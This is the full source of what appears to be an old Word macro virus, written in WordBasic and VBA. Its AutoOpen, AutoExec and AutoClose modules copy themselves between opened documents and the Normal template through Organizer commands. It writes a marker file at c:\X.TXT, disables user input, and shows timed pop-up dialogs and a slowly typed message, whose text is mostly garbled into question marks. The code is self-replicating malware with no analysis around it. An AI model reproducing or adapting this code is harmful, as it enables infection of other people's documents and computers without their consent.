   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.ToolsMacro Name:="New", Delete:=1, Show:=1
   WordBasic.ToolsMacro Name:="ORG", Delete:=1, Show:=1
   'If Day(Now()) >= Int(Rnd() * 30 + 1) Then
   'Call TEST
   'End If
   End Sub

   Attribute VB_Name = "AutoOpen"

   Dim nor$, fn$, F, G
   Public Sub MAIN()
   Dim CM3
   Dim i
   Dim AA
   nor$ = ""
   fn$ = ""
   F = 0
   G = 0
   On Error Resume Next
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo dlg
   nor$ = dlg.Template
   Rem Redim dlg As FileSummaryInfo
   fn$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 1)

   CM3 = WordBasic.CountMacros(0)
   If CM3 > 0 Then
     For i = 1 To CM3
        If WordBasic.[MacroName$](i, 0) = "New" Then AA = 1
     Next i
   End If
   If AA <> 1 Then
   WordBasic.ToolsMacro Name:="New", Edit:=1, Show:=1
   WordBasic.Insert "FileSaveAs .Format = ( 3 - 2 ) * 1 / 1 "
   WordBasic.InsertPara
   WordBasic.Insert "F = 1"
   WordBasic.InsertPara
   WordBasic.Insert "G = 1"
   WordBasic.InsertPara
   WordBasic.Insert "on error resume next"
   WordBasic.InsertPara
   WordBasic.Insert "Dim dlg As FileSummaryInfo"
   WordBasic.InsertPara
   WordBasic.Insert "GetCurValues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "nor$ = dlg.Template"
   WordBasic.InsertPara
   WordBasic.Insert "fn$ = FileNameInfo$(FileName$(),    1)"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy , .Source= nor$, .Destination= fn$, .Name =" + Chr(34) + "AutoExec" + Chr(34) + ", .Tab = F + G + 1"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= nor$, .Destination= fn$, .Name =" + Chr(34) + "AutoOpen" + Chr(34) + ", .Tab = F + G + 1"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= nor$, .Destination= fn$, .Name =" + Chr(34) + "AutoClose" + Chr(34) + ", .Tab = F + G + 1"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= nor$, .Destination= fn$, .Name =" + Chr(34) + "ToolsMacro" + Chr(34) + ",.Tab = F + G + 1"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= nor$, .Destination= fn$, .Name =" + Chr(34) + "A" + Chr(34) + ",.Tab = F + G + 1"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= nor$, .Destination= fn$, .Name =" + Chr(34) + "B" + Chr(34) + ",.Tab = F + G + 1"


   WordBasic.DocClose 1
   End If

   WordBasic.ToolsMacro Name:="ORG", Edit:=1, Show:=1
   WordBasic.Insert "on error resume next"
   WordBasic.InsertPara
   WordBasic.Insert "F = 1"
   WordBasic.InsertPara
   WordBasic.Insert "G = 1"
   WordBasic.InsertPara
   WordBasic.Insert "Dim dlg As FileSummaryInfo"
   WordBasic.InsertPara
   WordBasic.Insert "GetCurValues dlg"
   WordBasic.InsertPara
   WordBasic.Insert "nor$ = dlg.Template"
   WordBasic.InsertPara
   WordBasic.Insert "fn$ = FileNameInfo$(FileName$(),    1)"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy , .Source= fn$, .Destination= nor$, .Name =" + Chr(34) + "AutoExec" + Chr(34) + ", .Tab = F + G + 1"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= fn$, .Destination= nor$, .Name =" + Chr(34) + "AutoOpen" + Chr(34) + ", .Tab = F + G + 1"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= fn$, .Destination= nor$, .Name =" + Chr(34) + "AutoClose" + Chr(34) + ", .Tab = F + G + 1"
   WordBasic.InsertPara
   WordBasic.Insert "Organizer .Copy, .Source= fn$, .Destination= nor$, .Name =" + Chr(34) + "ToolsMacro" + Chr(34) + ",.Tab = F + G + 1"
   WordBasic.InsertPara

   WordBasic.Insert "Organizer .Copy, .Source= fn$, .Destination= nor$, .Name =" + Chr(34) + "A" + Chr(34) + ",.Tab = F + G + 1"
   WordBasic.InsertPara

   WordBasic.Insert "Organizer .Copy, .Source= fn$, .Destination= nor$, .Name =" + Chr(34) + "B" + Chr(34) + ",.Tab = F + G + 1"


   WordBasic.DocClose 1

   NBA
   End Sub

   Private Sub NBA()
   Dim cm
   Dim i
   Dim K
   Dim cm1
   Dim j
   Dim pp
   On Error Resume Next
   cm = WordBasic.CountMacros(0)
   If cm > 0 Then
     For i = 1 To cm
        If WordBasic.[MacroName$](i, 0) = "A" Then K = 1
     Next i
   End If
   If K <> 1 Then
   WordBasic.Call "ORG"
   End If

   cm1 = WordBasic.CountMacros(1)
   If cm1 > 0 Then
      For j = 1 To cm1
          If WordBasic.[MacroName$](j, 1) = "A" Then pp = 1
      Next j
   End If
   If pp <> 1 Then
   WordBasic.Call "New_"
   End If


   End Sub

   Attribute VB_Name = "AutoExec"

   Dim nor$, fn$, F, G
   Public Sub MAIN()
   Dim A$
   Dim c
   Dim pc5
   Dim pc4
   Dim pc3
   Dim pc2
   Dim pc1
   Dim a1$
   Dim a2$
   Dim a2_
   nor$ = ""
   fn$ = ""
   F = 0
   G = 0
   On Error Resume Next

   Open "c:\X.TXT" For Input As 1
   Input #1, A$
   Close 1

   If A$ = "1" Then GoTo form_

   Open "c:\X.TXT" For Output As 1
   Print #1, "1"
   Close 1

   c = WordBasic.Int(Rnd() * 2) + 1
   If c = 1 Or c = 3 Then GoTo exit_
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "???? "
       WordBasic.PushButton 0, 0, 88, 21, "5", "Push1"
   WordBasic.EndDialog
   Dim dlg5 As Object: Set dlg5 = WordBasic.CurValues.UserDialog
   pc5 = WordBasic.Dialog.UserDialog(dlg5, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "???? "
       WordBasic.PushButton 0, 0, 88, 21, "4", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Dim dlg4 As Object: Set dlg4 = WordBasic.CurValues.UserDialog
   pc4 = WordBasic.Dialog.UserDialog(dlg4, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "???? "
       WordBasic.PushButton 0, 0, 88, 21, "3", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Dim dlg3 As Object: Set dlg3 = WordBasic.CurValues.UserDialog
   pc3 = WordBasic.Dialog.UserDialog(dlg3, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "???? "
       WordBasic.PushButton 0, 0, 88, 21, "2", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Dim dlg2 As Object: Set dlg2 = WordBasic.CurValues.UserDialog
   pc2 = WordBasic.Dialog.UserDialog(dlg2, -1, 1000)
   WordBasic.Beep
   WordBasic.BeginDialog 88, 22, "???? "
       WordBasic.PushButton 0, 0, 88, 21, "1", "Push1"
   WordBasic.EndDialog
   Set dlg5 = WordBasic.CurValues.UserDialog
   Set dlg4 = WordBasic.CurValues.UserDialog
   Set dlg3 = WordBasic.CurValues.UserDialog
   Set dlg2 = WordBasic.CurValues.UserDialog
   Dim dlg1 As Object: Set dlg1 = WordBasic.CurValues.UserDialog
   pc1 = WordBasic.Dialog.UserDialog(dlg1, -1, 1000)
   WordBasic.Beep
   a1$ = WordBasic.[Left$](WordBasic.[CTime$](7), 2)
   a2$ = WordBasic.[Right$](WordBasic.[CTime$](7), 2)
   a2_ = WordBasic.Val(a2$)
   a2_ = a2_ + 2
   a2$ = Str(a2_)
   WordBasic.OnTime a1$ + ":" + a2$, "A"
   GoTo Bye

   form_:






   exit_:
   Open "c:\X.TXT" For Output As 1
   Print #1, "0"
   Close 1

   Bye:

   End Sub

   Attribute VB_Name = "B"

   Public Sub MAIN()
   Dim ph$
   Dim BB
   Dim i
   Dim pc$
   Dim SS As Object
   Dim st
   On Error Resume Next

   ph$ = WordBasic.[DefaultDir$](9) + "\clipart\divider1.wmf"
   WordBasic.BeginDialog 240, 120, "????"
       WordBasic.Picture 10, 6, 223, 15, ph$, 0, "Picture1"
       WordBasic.Text 10, 26, 221, 16, "???????????", "Text1"
       WordBasic.Text 10, 46, 221, 16, "?????????...", "Text2"
       WordBasic.Text 10, 66, 221, 16, "???????......", "Text3"
       WordBasic.OKButton 176, 96, 55, 21
   WordBasic.EndDialog

   Dim B As Object: Set B = WordBasic.CurValues.UserDialog
   BB = WordBasic.Dialog.UserDialog(B)
   If BB = -1 Then GoTo start

   start:

   For i = 1 To 30
   pc$ = WordBasic.[DefaultDir$](9) + "\clipart\coffee.wmf"
   WordBasic.BeginDialog 116, 74, "????"
       WordBasic.OKButton 37, 44, 39, 19
       WordBasic.Picture 1, 1, 114, 71, pc$, 0, "Picture2"
   WordBasic.EndDialog
   Set B = WordBasic.CurValues.UserDialog

   Set SS = WordBasic.CurValues.UserDialog
   st = WordBasic.Dialog.UserDialog(SS, -1, 2000)
   If st = -1 Then
   'Next i

   Open "c:\X.TXT" For Output As 1
   Print #1, "0"
   Close 1

   End If
   Next
   End Sub

   Attribute VB_Name = "A"

   Public Sub MAIN()
   Dim i
   WordBasic.DisableInput 1
   On Error Resume Next

   WordBasic.FileNew
   WordBasic.FormatFont Points:=25, Bold:=1
   WordBasic.CenterPara
   WordBasic.Insert "?   "
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.FontSize 18
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "17"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?..."
   For i = 1 To 3000
   Next i
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "????????,"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert "?"
   For i = 1 To 2000
   Next i
   WordBasic.Insert ". "
   For i = 1 To 3500
   Next i
   WordBasic.Insert ". "
   For i = 1 To 3500
   Next i
   WordBasic.Insert "."
   For i = 1 To 4000
   Next i
   WordBasic.InsertPara
   WordBasic.InsertPara
   WordBasic.FormatFont Points:=20, Bold:=1, Color:=6
   WordBasic.Insert "???????....."
   WordBasic.ToolsMacro Name:="B", Show:=1, Run:=1


   End Sub
